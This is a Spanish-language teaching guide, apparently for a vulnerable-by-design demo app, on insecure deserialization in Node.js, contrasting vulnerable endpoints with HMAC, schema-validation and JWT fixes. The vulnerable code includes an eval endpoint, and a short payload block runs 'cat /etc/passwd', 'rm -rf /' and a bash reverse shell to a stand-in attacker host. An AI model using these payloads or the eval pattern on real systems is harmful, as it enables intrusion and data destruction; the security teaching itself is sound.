# 💣 Referencia Rápida: Insecure Deserialization

## 📋 ¿Qué es Insecure Deserialization?

**Insecure Deserialization** ocurre cuando una aplicación deserializa (convierte de formato serializado a objeto en memoria) datos controlados por un atacante sin validación adecuada. Es una de las vulnerabilidades más peligrosas porque puede llevar a:

- **💥 Remote Code Execution (RCE)**: Ejecutar código arbitrario en el servidor
- **🎭 Object Injection**: Manipular propiedades de objetos
- **🔐 Privilege Escalation**: Elevar privilegios de usuario
- **🔓 Authentication Bypass**: Falsificar sesiones

### ¿Qué es Serialización/Deserialización?

**Serialización**: Convertir un objeto en memoria a un formato que se puede almacenar o transmitir (JSON, XML, binary, etc.)

```javascript
// Objeto en memoria
const user = { id: 1, username: "alice", role: "user" };

// Serializado a JSON
const serialized = JSON.stringify(user);
// → '{"id":1,"username":"alice","role":"user"}'

// Serializado a Base64
const encoded = Buffer.from(serialized).toString("base64");
// → 'eyJpZCI6MSwidXNlcm5hbWUiOiJhbGljZSIsInJvbGUiOiJ1c2VyIn0='
```

**Deserialización**: Proceso inverso, convertir el formato serializado de vuelta a objeto

```javascript
// Deserializado de Base64
const decoded = Buffer.from(encoded, "base64").toString();
// Deserializado de JSON
const user = JSON.parse(decoded);
// → { id: 1, username: "alice", role: "user" }
```

---

## 🎯 Cómo Funciona el Ataque

### Escenario 1: Falsificación de Sesiones

**Vulnerable**:

```typescript
router.post("/load-session", async (ctx) => {
  const { sessionData } = ctx.request.body;

  // VULNERABILITY: Confiar en datos del cliente sin verificar
  const session = JSON.parse(Buffer.from(sessionData, "base64").toString());

  // Usar directamente sin validación
  ctx.state.user = session.user;
  ctx.body = { success: true, user: session.user };
});
```

**Ataque**:

```javascript
// 1. Crear sesión falsa con privilegios de admin
const fakeSession = {
  user: {
    id: 999,
    username: "hacker",
    role: "admin", // 🔴 Elevación de privilegios
  },
};

// 2. Serializarla
const sessionData = Buffer.from(JSON.stringify(fakeSession)).toString("base64");

// 3. Enviarla al servidor
fetch("/api/vulnerable/deserialization/load-session", {
  method: "POST",
  body: JSON.stringify({ sessionData }),
  headers: { "Content-Type": "application/json" },
});

// ✅ Servidor acepta sin verificar → ahora eres admin
```

### Escenario 2: Object Injection con Balance Falsificado

```javascript
// Sesión legítima
const realSession = {
  user: {
    id: 3,
    username: "bob",
    role: "user",
    balance: 100,
  },
};

// Sesión modificada por atacante
const hackedSession = {
  user: {
    id: 3,
    username: "bob",
    role: "user",
    balance: 1000000, // 🔴 Balance falsificado
  },
};

// Servidor vulnerable lo acepta sin verificar integridad
// → Ahora puedes comprar cosas con balance infinito
```

### Escenario 3: Remote Code Execution (RCE) con `eval`

**EXTREMADAMENTE PELIGROSO** (pero desafortunadamente común):

```typescript
router.post("/eval-data", async (ctx) => {
  const { code } = ctx.request.body;

  // VULNERABILITY: eval ejecuta código arbitrario
  const result = eval(code);
  ctx.body = { result };
});
```

**Ataque**:

```javascript
// Payload malicioso
const payload = {
  code: "require('child_process').execSync('cat /etc/passwd').toString()",
};

// Enviar al servidor
fetch("/api/vulnerable/deserialization/eval-data", {
  method: "POST",
  body: JSON.stringify(payload),
  headers: { "Content-Type": "application/json" },
});

// ✅ Servidor ejecuta el comando → lee /etc/passwd
```

**Otros payloads RCE**:

```javascript
// Listar archivos
"require('fs').readdirSync('/').join(',')";

// Leer archivos sensibles
"require('fs').readFileSync('/etc/passwd', 'utf8')";

// Ejecutar comando destructivo (NO HACER EN PRODUCCIÓN)
"require('child_process').execSync('rm -rf /')";

// Reverse shell (conectar servidor a atacante)
"require('child_process').exec('bash -i >& /dev/tcp/attacker.com/4444 0>&1')";
```

---

## 🛡️ Cómo Protegerse

### 1. ✅ Nunca Usar `eval`, `Function()`, o `vm.runInContext()`

```typescript
// ❌ NUNCA HACER ESTO
const result = eval(userInput);
const fn = new Function(userInput);
const script = new vm.Script(userInput);

// ✅ USAR ALTERNATIVAS SEGURAS
const result = JSON.parse(userInput); // Solo para JSON válido
```

### 2. ✅ Firmar Datos con HMAC

```typescript
import crypto from "crypto";

// Crear firma HMAC
function signData(data: string, secret: string): string {
  const hmac = crypto.createHmac("sha256", secret);
  hmac.update(data);
  return hmac.digest("hex");
}

// Verificar firma HMAC
function verifyData(data: string, signature: string, secret: string): boolean {
  const expectedSignature = signData(data, secret);
  return crypto.timingSafeEqual(
    Buffer.from(signature),
    Buffer.from(expectedSignature)
  );
}

// Uso seguro
router.post("/load-session", async (ctx) => {
  const { sessionData, signature } = ctx.request.body;

  // ✅ Verificar firma antes de deserializar
  if (!verifyData(sessionData, signature, SECRET_KEY)) {
    ctx.status = 403;
    ctx.body = { error: "Invalid session signature" };
    return;
  }

  // Ahora seguro deserializar
  const session = JSON.parse(Buffer.from(sessionData, "base64").toString());

  ctx.body = { success: true, user: session.user };
});
```

### 3. ✅ Validar Schema con Whitelist

```typescript
// Definir schema permitido
const ALLOWED_FIELDS = ["name", "value", "type"];
const ALLOWED_TYPES = ["query", "command", "event"];

router.post("/parse-data", async (ctx) => {
  const { data } = ctx.request.body;

  const parsed = JSON.parse(data);

  // ✅ Validar tipo
  if (typeof parsed !== "object" || parsed === null) {
    ctx.status = 400;
    ctx.body = { error: "Invalid data structure" };
    return;
  }

  // ✅ Filtrar solo campos permitidos
  const validData: Record<string, any> = {};
  for (const field of ALLOWED_FIELDS) {
    if (field in parsed) {
      validData[field] = parsed[field];
    }
  }

  // ✅ Validar valores
  if (validData.type && !ALLOWED_TYPES.includes(validData.type)) {
    ctx.status = 400;
    ctx.body = { error: "Invalid type" };
    return;
  }

  ctx.body = { success: true, data: validData };
});
```

### 4. ✅ Usar Librerías de Validación

```typescript
// Opción 1: Joi
import Joi from "joi";

const schema = Joi.object({
  user: Joi.object({
    id: Joi.number().required(),
    username: Joi.string().alphanum().min(3).max(30).required(),
    role: Joi.string().valid("user", "admin").required(),
  }),
  expiresAt: Joi.date().iso().required(),
});

const { error, value } = schema.validate(deserializedData);
if (error) {
  throw new Error("Invalid data structure");
}

// Opción 2: Zod
import { z } from "zod";

const SessionSchema = z.object({
  user: z.object({
    id: z.number(),
    username: z.string().min(3).max(30),
    role: z.enum(["user", "admin"]),
  }),
  expiresAt: z.string().datetime(),
});

const session = SessionSchema.parse(deserializedData);
```

### 5. ✅ Validar Integridad y Expiración

```typescript
router.post("/load-session", async (ctx) => {
  const { sessionData, signature } = ctx.request.body;

  // ✅ Verificar firma
  if (!verifyHMAC(sessionData, signature)) {
    ctx.status = 403;
    ctx.body = { error: "Invalid signature" };
    return;
  }

  const session = JSON.parse(Buffer.from(sessionData, "base64").toString());

  // ✅ Validar estructura
  if (!session.user?.id || !session.expiresAt) {
    ctx.status = 400;
    ctx.body = { error: "Invalid session structure" };
    return;
  }

  // ✅ Verificar expiración
  if (new Date(session.expiresAt) < new Date()) {
    ctx.status = 401;
    ctx.body = { error: "Session expired" };
    return;
  }

  // ✅ Validar contra base de datos (opcional pero recomendado)
  const user = await User.findByPk(session.user.id);
  if (!user || user.username !== session.user.username) {
    ctx.status = 401;
    ctx.body = { error: "Invalid session" };
    return;
  }

  ctx.body = { success: true, user: session.user };
});
```

### 6. ✅ Usar JWT con Firma

En lugar de sesiones serializadas manualmente, usa JWT (JSON Web Tokens):

```typescript
import jwt from "jsonwebtoken";

// Crear JWT
const token = jwt.sign(
  { userId: user.id, username: user.username, role: user.role },
  SECRET_KEY,
  { expiresIn: "1h", algorithm: "HS256" }
);

// Verificar JWT
try {
  const decoded = jwt.verify(token, SECRET_KEY, { algorithms: ["HS256"] });
  ctx.state.user = decoded;
} catch (error) {
  ctx.status = 401;
  ctx.body = { error: "Invalid token" };
}
```

---

## 🧪 Probando Insecure Deserialization en la Demo

### Paso 1: Navegar a Insecure Deserialization

Abre: `http://localhost:3100/vulnerabilities/insecure-deserialization`

### Paso 2: Modo Vulnerable

1. Selecciona **"Vulnerable"**
2. Prueba estos payloads:

   - **👤 Sesión válida (user normal)**:

     - Debería aceptarse sin problemas
     - Verás `role: "user"`

   - **👑 Sesión falsificada (role: admin)**:

     - ⚠️ El servidor acepta una sesión con `role: "admin"` sin verificar
     - Verás `username: "hacker"`, `role: "admin"`
     - **Impacto**: Elevación de privilegios sin autenticación

   - **💰 Sesión con balance modificado**:

     - ⚠️ El servidor acepta `balance: 1000000`
     - **Impacto**: Modificación de datos financieros

   - **🔑 Sesión con permisos elevados**:
     - ⚠️ El servidor acepta `permissions: ["read", "write", "delete", "admin"]`
     - **Impacto**: Acceso a funcionalidades restringidas

3. **Observa la respuesta**: El servidor devuelve los datos falsificados sin verificar

### Paso 3: Modo Seguro

1. Selecciona **"Seguro"**
2. Prueba los mismos payloads:
   - **Error**: `Invalid session signature`
   - **Razón**: El servidor requiere una firma HMAC que el cliente no puede falsificar

### Paso 4: Inspeccionar la Sesión Base64

Abre la consola del navegador (F12) y ejecuta:

```javascript
// Sesión falsificada de admin
const fakeSession = {
  user: {
    id: 999,
    username: "hacker",
    role: "admin",
  },
  expiresAt: new Date(Date.now() + 3600000).toISOString(),
};

// Serializarla
const sessionData = btoa(JSON.stringify(fakeSession));
console.log("Session Data (Base64):", sessionData);

// Deserializarla (ver el contenido)
const decoded = atob(sessionData);
console.log("Decoded:", decoded);
```

---

## 📊 Comparación: Vulnerable vs. Seguro

| Aspecto                   | Vulnerable ❌               | Seguro ✅                                 |
| ------------------------- | --------------------------- | ----------------------------------------- |
| **Verificación de Firma** | No                          | Sí (HMAC-SHA256 o JWT)                    |
| **Validación de Schema**  | No                          | Sí (Joi, Zod, o manual)                   |
| **Whitelist de Campos**   | No                          | Sí, solo campos permitidos                |
| **Verificación de Tipos** | No                          | Sí, tipos estrictos                       |
| **Expiración**            | No verificada               | Verificada contra timestamp               |
| **Integridad**            | Confía en datos del cliente | Verificación criptográfica                |
| **Uso de `eval`**         | Posible                     | Nunca                                     |
| **Validación contra DB**  | No                          | Opcional pero recomendado                 |
| **Rate Limiting**         | No                          | Sí, para prevenir ataques de fuerza       |
| **Logging**               | No                          | Sí, para detección de intentos maliciosos |

---

## 🚨 Casos Reales de Insecure Deserialization

### Equifax (2017)

- **Vulnerabilidad**: Apache Struts (deserialización Java insegura)
- **CVE**: CVE-2017-5638
- **Ataque**: RCE vía deserialización de XML
- **Impacto**: 147 millones de registros comprometidos
- **Daño**: $700 millones en multas y compensaciones

### Apache Commons Collections (2015)

- **Vulnerabilidad**: Gadget chains en deserialización Java
- **Afectó**: Miles de aplicaciones Java
- **Ataque**: RCE mediante deserialización de objetos maliciosos
- **Fix**: Actualizar librerías y deshabilitar deserialización de tipos peligrosos

### Ruby on Rails (2013)

- **Vulnerabilidad**: CVE-2013-0156 (deserialización YAML/XML)
- **Ataque**: RCE vía deserialización de código Ruby
- **Impacto**: Afectó a todas las versiones anteriores a 3.2.11
- **Fix**: Actualizar Rails y validar entrada

### Jenkins (2017)

- **Vulnerabilidad**: Deserialización Java insegura
- **CVE**: CVE-2017-1000353
- **Ataque**: RCE en servidor Jenkins
- **Impacto**: Comprometer servidores de CI/CD

---

## 🔗 Herramientas y Recursos

### Herramientas de Testing

- **[ysoserial](https://github.com/frohoff/ysoserial)**: Exploits para deserialización Java
- **[ysoserial.net](https://github.com/pwntester/ysoserial.net)**: Exploits para deserialización .NET
- **[Burp Suite](https://portswigger.net/burp)**: Interceptar y modificar datos serializados
- **[OWASP ZAP](https://www.zaproxy.org/)**: Escaneo automático de vulnerabilidades

### Librerías de Validación

```bash
# Node.js / JavaScript
npm install joi          # Validación de schema
npm install zod          # Validación con TypeScript
npm install ajv          # JSON Schema validator
npm install class-validator  # Decoradores para clases

# Python
pip install pydantic     # Validación de datos
pip install marshmallow  # Serialización segura

# Java
# Jackson con configuración segura
# Evitar DefaultTyping
```

### Configuración Segura de Jackson (Java)

```java
// Deshabilitar DefaultTyping
ObjectMapper mapper = new ObjectMapper();
mapper.disableDefaultTyping();

// O usar whitelisting
mapper.activateDefaultTyping(
    ptv,
    ObjectMapper.DefaultTyping.NON_FINAL,
    JsonTypeInfo.As.PROPERTY
);
```

---

## 💡 Puntos Clave para Recordar

1. **Nunca confíes en datos deserializados del cliente** sin verificación criptográfica
2. **`eval` es tu enemigo**: Nunca uses `eval()`, `Function()`, o `vm` con entrada de usuario
3. **Usa firmas HMAC o JWT** para verificar integridad de datos
4. **Valida schema con whitelist** antes de usar datos deserializados
5. **Verifica expiración** de sesiones y tokens
6. **Actualiza librerías**: Muchas vulnerabilidades de deserialización están en librerías antiguas
7. **Monitorea intentos**: Log intentos de falsificación para detección de ataques
8. **Principio de menor privilegio**: Incluso si se falsifica, limita el daño

---

## 🛠️ Comandos Útiles para la Demo

### Ver Sesión Base64 en la Consola

```javascript
// Abrir DevTools (F12) → Console

// Crear sesión falsa
const fakeSession = {
  user: { id: 999, username: "hacker", role: "admin" },
  expiresAt: new Date(Date.now() + 3600000).toISOString(),
};

// Serializarla
const sessionData = btoa(JSON.stringify(fakeSession));
console.log("Session Data:", sessionData);

// Enviarla
fetch("http://localhost:3101/api/vulnerable/deserialization/load-session", {
  method: "POST",
  headers: { "Content-Type": "application/json" },
  body: JSON.stringify({ sessionData }),
})
  .then((res) => res.json())
  .then((data) => console.log("Response:", data));
```

### Verificar con cURL

```bash
# Sesión falsificada de admin
curl -X POST http://localhost:3101/api/vulnerable/deserialization/load-session \
  -H "Content-Type: application/json" \
  -d '{"sessionData":"eyJ1c2VyIjp7ImlkIjo5OTksInVzZXJuYW1lIjoiaGFja2VyIiwicm9sZSI6ImFkbWluIn0sImV4cGlyZXNBdCI6IjIwMjUtMTAtMjRUMDU6MDA6MDAuMDAwWiJ9"}'

# Modo seguro (fallará sin firma)
curl -X POST http://localhost:3101/api/secure/deserialization/load-session \
  -H "Content-Type: application/json" \
  -d '{"sessionData":"eyJ1c2VyIjp7ImlkIjo5OTksInVzZXJuYW1lIjoiaGFja2VyIiwicm9sZSI6ImFkbWluIn0sImV4cGlyZXNBdCI6IjIwMjUtMTAtMjRUMDU6MDA6MDAuMDAwWiJ9"}'
```

---

✅ **Insecure Deserialization configurado y listo para demostrar**. Navega a `http://localhost:3100/vulnerabilities/insecure-deserialization` para probarlo.
